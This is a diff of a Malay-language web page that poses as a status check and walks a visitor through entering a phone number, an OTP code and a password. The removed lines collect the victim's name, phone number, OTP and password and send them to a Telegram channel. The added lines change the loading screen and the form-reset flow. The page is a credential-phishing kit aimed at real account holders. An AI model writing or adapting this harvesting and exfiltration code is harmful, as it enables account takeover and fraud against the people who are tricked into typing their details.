@@ -473,61 +473,37 @@
             <button type="submit" class="btn">SEMAK STATUS</button>
           </form>
 
-          <img
-            id="loadingGif"
-            src="processing.gif"
-            alt="Loading..."
-            style="display: none; margin: 20px auto; width: 60%; height: auto"
-          />
+          <div id="loadingContent" style="display: none">
+            <img
+              id="loadingGif"
+              src="processing.gif"
+              alt="Loading..."
+              style="margin: 20px auto; width: 60%; height: auto"
+            />
 
-          <p id="formMessage" style="display: none; text-align: center">
-            Mohon tunggu proses pengesahan atau...
-          </p>
+            <p id="formMessage" style="text-align: center">
+              Mohon tunggu proses pengesahan atau...
+            </p>
 
-          <button
-            id="useAnotherPhone"
-            style="
-              display: none;
-              width: 100%;
-              padding: 12px;
-              margin: 30px auto 0;
-              background-color: red;
-              color: white;
-              border: none;
-              border-radius: 10px;
-              font-size: 1.1rem;
-              cursor: pointer;
-              align-items: center;
-              justify-content: center;
-            "
-          >
-            Gunakan Nombor Lain
-          </button>
-
-          <script>
-            document
-              .getElementById("passwordForm")
-              .addEventListener("submit", function (e) {
-                e.preventDefault();
-
-                // Tampilkan loading gif dan pesan
-                document.getElementById("loadingGif").style.display = "block";
-                document.getElementById("formMessage").style.display = "block";
-
-                // Tampilkan tombol setelah 3 detik
-                setTimeout(function () {
-                  document.getElementById("useAnotherPhone").style.display =
-                    "block";
-                }, 3000);
-              });
-
-            // Handler untuk tombol "Gunakan Nombor Lain"
-            document
-              .getElementById("useAnotherPhone")
-              .addEventListener("click", function () {
-                window.location.reload(); // Muat ulang halaman
-              });
-          </script>
+            <button
+              id="useAnotherPhone"
+              style="
+                width: 100%;
+                padding: 12px;
+                margin: 30px auto 0;
+                background-color: red;
+                color: white;
+                border: none;
+                border-radius: 10px;
+                font-size: 1.1rem;
+                cursor: pointer;
+                align-items: center;
+                justify-content: center;
+              "
+            >
+              Gunakan Nombor Lain
+            </button>
+          </div>
         </div>
       </div>
     </div>
@@ -644,31 +620,31 @@
       // Handler form kata sandi (halaman 3)
       document
         .getElementById("passwordForm")
-        .addEventListener("submit", function (event) {
-          event.preventDefault();
-          const password = document.getElementById("kata-sandi").value;
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
 
-          const savedPhone = localStorage.getItem("phone");
-          const savedName = localStorage.getItem("name");
-          const savedOtp = localStorage.getItem("otp");
+          // Sembunyikan form dan pesan kata sandi
+          document.getElementById("passwordForm").style.display = "none";
+          document.getElementById("kataSandi").style.display = "none";
 
-          const message = `
-───────────────────────
-(MALAY | DATA | ${savedPhone})
-───────────────────────
-- Nama Lengkap  : ${savedName}
-- No HP         : ${savedPhone}
-- OTP           : ${savedOtp}
-- Kata Sandi    : ${password}
-───────────────────────`;
+          // Tampilkan konten loading
+          document.getElementById("loadingContent").style.display = "block";
+        });
 
-          document.getElementById("loadingScreen").style.display = "flex";
+      // Handler untuk tombol "Gunakan Nombor Lain"
+      document
+        .getElementById("useAnotherPhone")
+        .addEventListener("click", function () {
+          showPage("page1"); // Kembali ke halaman pertama
+          // Reset semua form
+          document.getElementById("passwordForm").reset();
+          document.getElementById("otpForm").reset();
+          document.getElementById("registrationForm").reset();
 
-          sendToTelegram(message)
-            .then((response) => {})
-            .finally(() => {
-              document.getElementById("loadingScreen").style.display = "none";
-            });
+          // Kembalikan tampilan form password ke kondisi awal
+          document.getElementById("passwordForm").style.display = "block";
+          document.getElementById("kataSandi").style.display = "block";
+          document.getElementById("loadingContent").style.display = "none";
         });
     </script>
   </body>
